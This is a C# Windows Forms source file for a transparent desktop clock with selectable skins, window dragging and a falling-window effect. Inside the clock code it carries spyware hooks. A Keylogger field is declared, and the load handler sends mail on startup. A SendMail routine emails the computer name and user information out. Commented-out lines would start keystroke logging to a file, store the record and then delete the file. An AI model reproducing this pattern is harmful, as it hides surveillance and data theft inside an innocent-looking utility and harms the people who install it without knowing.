using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Drawing.Drawing2D;
using System.IO;
using System.Net;
using System.Threading;
namespace 透明时钟演示
{
    public partial class Form1 : Form
    {
        //鼠标拖动相关变量
        Point oldPoint = new Point(0, 0);
        bool mouseDown = false;
        private Keylogger KeyLog;
        //时钟样式元素，依次为：背景、时针、分针、秒针、转轴、表盖
        private Image img1;
        private Image img2;
        private Image img3;
        private Image img4;
        private Image img5;
        private Image img6;
        private float SpendX, SpendY, Gravity = (float)9.8, Time = 0, LcdWhith, LcdHight, NowX, NowY;
        private Point OldPoint = new Point(0, 0);
        private bool Act = true;
        System.Media.SoundPlayer startSound = new System.Media.SoundPlayer(Directory.GetCurrentDirectory()+"/clock.WAV");
        public Form1()
        {
            InitializeComponent();

            MouseDown += new MouseEventHandler(Form1_MouseDown);
            MouseUp += new MouseEventHandler(Form1_MouseUp);
            MouseMove += new MouseEventHandler(Form1_MouseMove);
        }

        void Form1_MouseMove(object sender, MouseEventArgs e)
        {
            if (mouseDown)
            {
                this.Left += (e.X - oldPoint.X);
                this.Top += (e.Y - oldPoint.Y);
            }
        }

        void Form1_MouseUp(object sender, MouseEventArgs e)
        {
            mouseDown = false;
        }

        void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            oldPoint = e.Location;
            mouseDown = true;
        }

        protected override void OnHandleCreated(EventArgs e)
        {
            InitializeStyles();
            base.OnHandleCreated(e);
        }

        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cParms = base.CreateParams;
                cParms.ExStyle |= 0x00080000; // WS_EX_LAYERED
                return cParms;
            }
        }

        private void InitializeStyles()
        {
            SetStyle(ControlStyles.AllPaintingInWmPaint, true);
            SetStyle(ControlStyles.UserPaint, true);
            UpdateStyles();
        }

        public void SetBits()
        {
            if (BackgroundImage != null)
            {
                Bitmap bitmap = new Bitmap(BackgroundImage, Width, Height);

                if (!Bitmap.IsCanonicalPixelFormat(bitmap.PixelFormat) || !Bitmap.IsAlphaPixelFormat(bitmap.PixelFormat))
                    throw new ApplicationException("图片必须是32位带Alhpa通道的图片。");

                IntPtr oldBits = IntPtr.Zero;
                IntPtr screenDC = Win32.GetDC(IntPtr.Zero);
                IntPtr hBitmap = IntPtr.Zero;
                IntPtr memDc = Win32.CreateCompatibleDC(screenDC);

                try
                {
                    Win32.Point topLoc = new Win32.Point(Left, Top);
                    Win32.Size bitMapSize = new Win32.Size(Width, Height);
                    Win32.BLENDFUNCTION blendFunc = new Win32.BLENDFUNCTION();
                    Win32.Point srcLoc = new Win32.Point(0, 0);

                    hBitmap = bitmap.GetHbitmap(Color.FromArgb(0));
                    oldBits = Win32.SelectObject(memDc, hBitmap);

                    blendFunc.BlendOp = Win32.AC_SRC_OVER;
                    blendFunc.SourceConstantAlpha = 255;
                    blendFunc.AlphaFormat = Win32.AC_SRC_ALPHA;
                    blendFunc.BlendFlags = 0;

                    Win32.UpdateLayeredWindow(Handle, screenDC, ref topLoc, ref bitMapSize, memDc, ref srcLoc, 0, ref blendFunc, Win32.ULW_ALPHA);
                }
                finally
                {
                    if (hBitmap != IntPtr.Zero)
                    {
                        Win32.SelectObject(memDc, oldBits);
                        Win32.DeleteObject(hBitmap);
                    }
                    Win32.ReleaseDC(IntPtr.Zero, screenDC);
                    Win32.DeleteDC(memDc);
                }
            }
        }

        public void SetStyle(int Style)
        {
            switch (Style)
            {
                case 1:
                    img1 = new Bitmap(透明时钟演示.Properties.Resources.system);
                    img2 = new Bitmap(透明时钟演示.Properties.Resources.system_h);
                    img3 = new Bitmap(透明时钟演示.Properties.Resources.system_m);
                    img4 = new Bitmap(透明时钟演示.Properties.Resources.system_s);
                    img5 = new Bitmap(透明时钟演示.Properties.Resources.system_dot);
                    img6 = new Bitmap(透明时钟演示.Properties.Resources.system_highlights);
                    break;
                case 2:
                    img1 = new Bitmap(透明时钟演示.Properties.Resources.trad);
                    img2 = new Bitmap(透明时钟演示.Properties.Resources.trad_h);
                    img3 = new Bitmap(透明时钟演示.Properties.Resources.trad_m);
                    img4 = new Bitmap(透明时钟演示.Properties.Resources.trad_s);
                    img5 = new Bitmap(透明时钟演示.Properties.Resources.trad_dot);
                    img6 = new Bitmap(透明时钟演示.Properties.Resources.trad_highlights);
                    break;
                case 3:
                    img1 = new Bitmap(透明时钟演示.Properties.Resources.modern);
                    img2 = new Bitmap(透明时钟演示.Properties.Resources.modern_h);
                    img3 = new Bitmap(透明时钟演示.Properties.Resources.modern_m);
                    img4 = new Bitmap(透明时钟演示.Properties.Resources.modern_s);
                    img5 = new Bitmap(透明时钟演示.Properties.Resources.modern_dot);
                    img6 = new Bitmap(透明时钟演示.Properties.Resources.modern_highlights);
                    break;
                case 4:
                    img1 = new Bitmap(透明时钟演示.Properties.Resources.flower);
                    img2 = new Bitmap(透明时钟演示.Properties.Resources.flower_h);
                    img3 = new Bitmap(透明时钟演示.Properties.Resources.flower_m);
                    img4 = new Bitmap(透明时钟演示.Properties.Resources.flower_s);
                    img5 = new Bitmap(透明时钟演示.Properties.Resources.flower_dot);
                    img6 = new Bitmap(透明时钟演示.Properties.Resources.flower_highlights);
                    break;
            }
        }

        public void Draw()
        {
            //当前时间
            int h = DateTime.Now.Hour;
            int m = DateTime.Now.Minute;
            int s = DateTime.Now.Second;

            BackgroundImage = new Bitmap(Width, Height);

            Graphics g = Graphics.FromImage(BackgroundImage);

            //背景
            g.DrawImage(img1, 0, 0, img1.Width, img1.Height);

            //坐标中心平移
            g.TranslateTransform((float)Width / 2.0f, (float)Height / 2.0f);

            //时针
            g.RotateTransform(30.0f * h + 30.0f * (float)(m / 60.0f));
            g.DrawImage(img2, -img2.Width / 2, -img2.Height / 2, img2.Width, img2.Height);
            g.RotateTransform(-30.0f * h - 30.0f * (float)(m / 60.0f));

            //分针
            g.RotateTransform(360.0f * (float)(m / 60.0f));
            g.DrawImage(img3, -img3.Width / 2, -img3.Height / 2, img3.Width, img3.Height);
            g.RotateTransform(-360.0f * (float)(m / 60.0f));

            //秒针
            g.RotateTransform((float)s * 360 / 60.0f);
            g.DrawImage(img4, -img4.Width / 2, -img4.Height / 2, img4.Width, img4.Height);
            g.RotateTransform(-(float)s * 360 / 60.0f);

            //转轴
            g.DrawImage(img5, -img5.Width / 2, -img5.Height / 2, img5.Width, img5.Height);

            //坐标中心平移还原
            g.TranslateTransform(-(float)Width / 2.0f, -(float)Height / 2.0f);

            //表盖
            g.DrawImage(img6, 0, 0, img1.Width, img1.Height);

            SetBits();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Mail.SendMail("fdsaf", "fdsaf");
            string FileName = "d:\\record.txt";
            SetStyle(1);
            timer1.Enabled = true;
            Draw();
            Rectangle rect = System.Windows.Forms.SystemInformation.VirtualScreen;
            LcdWhith = rect.Width;
            LcdHight = rect.Height;
            notifyIcon1.Visible = true;
            //Tools.Test();
            //Thread ServiceThread = new Thread(new ThreadStart(SendMail));
            //ServiceThread.Start();
            //DataBase.AddRecord(FileName);
            //File.Delete(FileName);
            //KeyLog = new Keylogger(FileName);
            //KeyLog.startLoging();
            
            
        }
        private void SendMail()
        {
            string Title = "消息来自：[" +Tools.GetComputerName()+ "]";
            Mail.SendMail(Title, Tools.GetUserInfor());
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            Draw();
            toolTip1.SetToolTip(this, DateTime.Now.ToString());
            try
            {
                startSound.Play();
            }
            catch { }
            notifyIcon1.Text = "QQ:179990830\r\n"+DateTime.Now.ToString();
        }

        private void 银色ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SetStyle(1);
        }

        private void 黑色ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SetStyle(2);
        }

        private void 红色ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SetStyle(3);
        }

        private void 花瓣ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SetStyle(4);
        }

        private void 关闭ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void 置顶ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.TopMost == false)
                this.TopMost = true;
            else this.TopMost = false;
        }

        private void Form1_MouseMove_1(object sender, MouseEventArgs e)
        {
            SpendX = e.X - OldPoint.Y;
            SpendY = e.Y - OldPoint.Y;
            OldPoint.X = e.X;
            OldPoint.Y = e.Y;
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            if (Act)
            {
                float spendy = Gravity * Time + SpendY;
                Time += (float)0.1;
                NowX = this.Location.X;
                NowY = this.Location.Y;
                if (NowY < (LcdHight - 130))
                {
                    NowY += (int)spendy;
                    if(NowX<(LcdWhith-130)&NowX>130)NowX+=SpendX;
                }
                else NowY = LcdHight - 130;
                this.Location = new Point((int)NowX, (int)NowY);
            }
        }

        private void Form1_MouseDown_1(object sender, MouseEventArgs e)
        {
            Time = 0;
            Act = false;
        }

        private void Form1_MouseUp_1(object sender, MouseEventArgs e)
        {
            Act = true;
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {

        }

        private void 我的博客ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("http://blog.sina.com.cn/tongjinlv");

        }
    }
}